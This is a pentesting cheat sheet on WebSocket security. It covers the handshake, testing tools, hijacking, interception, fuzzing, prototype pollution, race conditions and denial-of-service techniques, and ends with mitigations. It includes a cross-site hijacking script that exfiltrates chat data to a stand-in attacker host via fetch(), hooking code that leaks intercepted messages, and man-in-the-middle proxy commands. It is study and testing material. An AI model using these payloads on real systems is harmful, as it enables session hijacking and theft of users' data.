## 🎯 Theory & Core Concepts

WebSockets are a **bi-directional, full duplex communications protocol** initiated over HTTP, enabling real-time, persistent connections between clients and servers. They're particularly powerful for applications requiring **low latency or server-initiated communication** (live financial data, chat systems, gaming, real-time dashboards).

### Connection Establishment Flow

WebSocket connections begin with an **HTTP handshake** that upgrades to a persistent connection:

**Client Initiates Connection:**

```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```

- `wss://` = WebSocket over **TLS** (secure)
- `ws://` = **Unsecured** WebSocket connection

**Browser Handshake Request:**

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

**Server Handshake Response:**

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

**Critical Headers Explained:**

- `Connection` & `Upgrade` → Signal WebSocket handshake initiation
- `Sec-WebSocket-Version` → Protocol version (typically **13**)
- `Sec-WebSocket-Key` → Base64-encoded random value (prevents caching issues, **not for authentication**)
- `Sec-WebSocket-Accept` → Hash of `Sec-WebSocket-Key` (confirms server intent)

---

## 🔧 Reconnaissance & Enumeration

### Essential Testing Tools

**1. Automated Discovery & Fingerprinting**

```bash
# STEWS - Discover, fingerprint, find known vulns
https://github.com/PalindromeLabs/STEWS
```

**2. Raw Connection Testing**

```bash
# Websocat - Establish raw WS connections
websocat --insecure wss://10.10.10.10:8000 -v

# Create websocat server
websocat -s 0.0.0.0:8000
```

**3. Interactive Testing Environments**

- **Burp Suite** → MitM WebSocket traffic (like HTTP)
    - [**SockeSleuth Extension**](https://github.com/snyk/socketsleuth) → History, interception rules, match/replace, Intruder, AutoRepeater
- [**WSSiP**](https://github.com/nccgroup/wssip) → Node.js proxy for WebSocket/Socket.io (capture, intercept, send custom messages)
- [**wsrepl**](https://github.com/doyensec/wsrepl) → Interactive REPL for penetration testing (automation-friendly)
- [**WebSocketKing**](https://websocketking.com/) → Web-based WS communication interface
- [**Hoppscotch**](https://hoppscotch.io/realtime/websocket) → Multi-protocol testing (includes WebSockets)

**4. Traffic Decryption**

- [PyCript](https://github.com/Anof-cyber/PyCript)
- [PyCript-WebSocket](https://github.com/Anof-cyber/PyCript-WebSocket/)

---

## 🎯 Exploitation Methods

### 1. Cross-Site WebSocket Hijacking (CSWSH)

**🔍 Vulnerability Conditions:**

**MUST Have (All Required):**

- ✅ Cookie-based authentication
- ✅ Cookie accessible from attacker domain (`SameSite=None`)
- ✅ No Firefox Total Cookie Protection / Chrome third-party cookie blocking
- ✅ Server doesn't validate `Origin` header (or bypassable)

**Special Case:**

- ✅ Localhost/local network connections are **always exploitable** (no current protections)

---

#### Attack Scenario 1: Simple History Exfiltration

**Target Behavior:** Server sends conversation history when receiving "READY" message

```html
<script>
websocket = new WebSocket('wss://vulnerable-app.com/chat')
websocket.onopen = start
websocket.onmessage = handleReply

function start(event) {
  websocket.send("READY"); // Trigger data retrieval
}

function handleReply(event) {
  // Exfiltrate to attacker server
  fetch('https://attacker-collab.com/?'+event.data, {mode: 'no-cors'})
}
</script>
```

---

#### Attack Scenario 2: Subdomain XSS + Cookie Sharing

**Context:** Execute JavaScript in subdomain (`sub.victim.com`) → Access parent domain cookies → Hijack WebSocket

**Example:** [Gitpod RCE via WebSockets](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/)

**Exploitation Steps:**

1. Find XSS in any subdomain
2. Execute malicious JavaScript
3. Cookie sent to WebSocket server (same parent domain)
4. Bypass weak Origin validation
5. Steal authentication tokens

---

#### Attack Scenario 3: Message Interception & Exfiltration

**Setup:** Clone target web application → Inject WebSocket hooking code

```html
<!-- Load WebSocket hooker -->
<script src="wsHook.js"></script>

<script>
// Intercept outgoing client messages
wsHook.before = function(data, url) {
  var xhttp = new XMLHttpRequest();
  xhttp.open("GET", "client_msg?m=" + data, true);
  xhttp.send();
}

// Intercept incoming server messages
wsHook.after = function(messageEvent, url, wsObject) {
  var xhttp = new XMLHttpRequest();
  xhttp.open("GET", "server_msg?m=" + messageEvent.data, true);
  xhttp.send();
  return messageEvent;
}
</script>
```

**Download wsHook.js:**

```bash
wget https://raw.githubusercontent.com/skepticfx/wshook/master/wsHook.js
```

**Host Malicious Site:**

```bash
sudo python3 -m http.server 80
```

---

### 2. Man-in-the-Middle (MitM) Attacks

**Scenario:** Local network with HTTP WebSocket connections

**Exploitation Steps:**

1. Perform [ARP Spoofing](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/#arp-spoofing)
2. Position yourself between client & server
3. Intercept/modify WebSocket traffic

```bash
# Proxy WS traffic through your machine
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```

---

### 3. Advanced Fuzzing Techniques

#### Burp Extension: Backslash Powered Scanner

Now supports **WebSocket fuzzing** → [Learn more](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner)

---

#### WebSocket Turbo Intruder (Burp Extension)

**Install:** BApp Store or [GitHub Source](https://github.com/d0ge/WebSocketTurboIntruder)

**Two Components:**

1. **Turbo Intruder** → High-volume messaging to single WS endpoint
2. **HTTP Middleware** → Expose local HTTP endpoint that forwards bodies as WS messages (enables HTTP scanners to probe WS backends)

---

**Basic Fuzzing Script:**

```python
def queue_websockets(upgrade_request, message):
    connection = websocket_connection.create(upgrade_request)
    for i in range(10):
        connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
    results_table.add(websocket_message)
```

**🎯 Pro Tip:** Use decorators like `@MatchRegex()` to filter noise when messages trigger multiple responses

---

**HTTP Bridge for Scanner Integration:**

```python
def create_connection(upgrade_request):
    connection = websocket_connection.create(upgrade_request)
    return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
    results_table.add(websocket_message)
```

**Send HTTP Locally (body → WS message):**

```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```

**🚀 Motivation:** This unlocks automated scanning tools for WebSocket backends!

---

#### Socket.IO Handling

**Detection:** Look for `EIO` query parameter (e.g., `EIO=4`)

**Session Management:**

- **Ping:** `2`
- **Pong:** `3`
- **Start Conversation:** `40`
- **Emit Events:** `42["message","hello"]`

**Intruder Script:**

```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
    connection = websocket_connection.create(
        upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
    connection.queue('40')
    connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
    results_table.add(websocket_message)
```

**HTTP Adapter Variant:**

```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
    connection = websocket_connection.create(
        upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
    connection.queue('40')
    connection.decIn()
    return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
    results_table.add(websocket_message)
```

---

### 4. Server-Side Prototype Pollution (Socket.IO)

**Safe Detection Method:**

```json
{"__proto__":{"initialPacket":"Polluted"}}
```

**Indicators of Success:**

- Greetings/behavior changes
- Echo includes "Polluted"
- Server-side prototypes compromised

**Impact Assessment:** Correlate with [NodeJS Prototype Pollution Gadgets](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/)

**🔥 Action Step:** Chain with RCE gadgets for maximum impact!

---

### 5. Race Condition Exploitation

**Default Engine Limitation:** Batches messages on one connection (great throughput, poor for races)

**Solution:** Use **THREADED engine** → Spawn multiple WS connections, fire payloads in parallel

**Attack Scenarios:**

- Double-spend vulnerabilities
- Token reuse
- State desynchronization
- Multi-step transaction bypass

**📚 Deep Dive:** [Race Condition Methodology](https://book.hacktricks.xyz/pentesting-web/race-condition#rc-in-websockets)

**Reference POC:**

- [WS_RaceCondition_PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

---

### 6. Denial of Service (DoS): Ping of Death

**Attack Vector:** Craft WS frames with **huge payload length** header but send **no body**

**Vulnerable Behavior:** Server trusts length header → Pre-allocates buffer near `Integer.MAX_VALUE` → Out-of-Memory crash

**Impact:** Remote unauthenticated DoS

**Reference:** [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)

**⚠️ Warning:** Use only in authorized testing environments!

---

### 7. WebSocket Smuggling

**Objective:** Bypass reverse proxy restrictions by faking WebSocket establishment

**Impact:** Access hidden endpoints behind proxy

**📖 Deep Dive:** [H2C Smuggling Techniques](https://book.hacktricks.xyz/pentesting-web/h2c-smuggling)

---

### 8. Classic Web Vulnerabilities via WebSockets

**Remember:** WebSockets are just **data transport mechanisms**

**Vulnerable Input Points:**

- ✅ XSS (Cross-Site Scripting)
- ✅ SQLi (SQL Injection)
- ✅ Command Injection
- ✅ Path Traversal
- ✅ SSRF (Server-Side Request Forgery)
- ✅ Deserialization attacks

**Testing Approach:** Treat WebSocket messages like any HTTP parameter

**🎯 Quick Win:** Test every WS input field with classic payloads!

---

## 🛡️ Defense Bypasses

### Bypassing Origin Validation

**Common Weaknesses:**

- Regex flaws (`startsWith`, `endsWith` without anchors)
- Subdomain wildcards (`*.victim.com` accepts `attacker-victim.com`)
- Null/undefined origin handling
- Case-sensitivity issues

**Bypass Techniques:**

1. Test `Origin: null`
2. Try subdomain variations
3. Use HTTPS → HTTP downgrade
4. Exploit localhost special cases

---

### Evading SameSite Cookie Protection

**Chrome Vulnerability Window:**

- First **2 minutes** after cookie creation → Treated as `SameSite=None`
- Attack window for fresh sessions

**Firefox Bypass:**

- Total Cookie Protection not universally enabled
- Check target browser base

---

## 🚀 Higher Impact Scenarios

### Chaining for Maximum Damage

**Example Chain:**

1. Find CSWSH vulnerability
2. Exploit to steal admin session token
3. Use token to access Socket.IO endpoint
4. Trigger server-side prototype pollution
5. Chain with RCE gadget
6. Full server compromise

**🔥 Motivation:** Each vulnerability is a stepping stone—think chains, not single exploits!

---

### Practice Lab Environment

**Burp Suite Montoya Course Lab:**

- [GitHub Repository](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course)
- [Detailed Tutorial](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/)

---

## 🛡️ Mitigations & Secure Implementation

### Essential Protection Mechanisms

**1. Origin Header Validation**

```python
# Server-side check
allowed_origins = ['https://trusted-site.com', 'https://app.trusted.com']
if request.origin not in allowed_origins:
    reject_connection()
```

**2. Token-Based Authentication**

```javascript
// Replace cookie-based auth
var ws = new WebSocket("wss://site.com/ws?token=" + auth_token)
```

**3. SameSite Cookie Attribute**

```http
Set-Cookie: session=xyz; SameSite=Strict; Secure; HttpOnly
```

**Modern Browser Defaults:**

- Chrome: `SameSite=Lax` by default (except first 2 minutes)
- Protection level: **Lax** or **Strict**

**4. Firefox Total Cookie Protection**

- Isolates cookies per site
- Prevents third-party cookie access
- Blocks CSWSH completely

**5. Chrome Third-Party Cookie Blocking**

- Prevents cross-site cookie transmission
- Even with `SameSite=None`

**6. Rate Limiting & Connection Limits**

```python
# Prevent race conditions & DoS
max_connections_per_ip = 10
max_messages_per_second = 100
```

**7. Input Validation & Output Encoding**

```python
# Treat WS input like HTTP parameters
sanitize_input(websocket_message)
encode_output(response_message)
```

**8. Frame Size Validation**

```python
# Prevent Ping of Death
max_frame_size = 1048576  # 1MB
if frame_header.payload_length > max_frame_size:
    reject_frame()
```

---

## 🎯 CLI & Debugging Tips

### Headless Fuzzing

```bash
java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>
```

### Advanced Debugging Features

- **WS Logger:** Capture/correlate messages with internal IDs
- __inc_/dec_ Helpers:** Tweak message ID handling
- **Decorators:** `@PingPong`, `@Pong` reduce noise
- **isInteresting():** Filter relevant responses

---

## 📚 Essential References

- [PortSwigger WebSockets Security](https://portswigger.net/web-security/websockets)
- [CSWSH Exploitation 2025](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder Research](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [Server-Side Prototype Pollution Detection](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [Turbo Intruder Background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)

---

## 🚀 Final Motivation Boost

**Your WebSocket Testing Workflow:**

1. **Reconnaissance** → Map all WS endpoints (15 min)
2. **Quick Wins** → Test CSWSH conditions (10 min)
3. **Deep Dive** → Fuzzing with Turbo Intruder (30 min)
4. **Chain Attacks** → Combine findings for critical impact (45 min)

**Remember:** Every WebSocket is a potential goldmine. Treat each connection as a unique attack surface!